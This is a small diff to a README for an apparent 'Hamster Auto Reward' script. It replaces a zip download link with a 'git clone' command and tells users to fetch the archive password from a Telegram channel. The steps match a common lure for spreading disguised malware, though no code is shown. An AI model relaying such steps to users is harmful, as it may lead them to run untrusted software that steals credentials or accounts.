@@ -7,7 +7,9 @@
 ## Auto get reward script usage
 ### Step 1
 Download the script from this link
-https://github.com/ThisisANOM/Hamster/blob/main/Hamster%20Auto%20Reward.zip
+```
+git clone https://github.com/ThisisANOM/Hamster/
+```
 ### Step 2
 Get the file pass from telegram channel
 https://t.me/MemoryOfNaengi
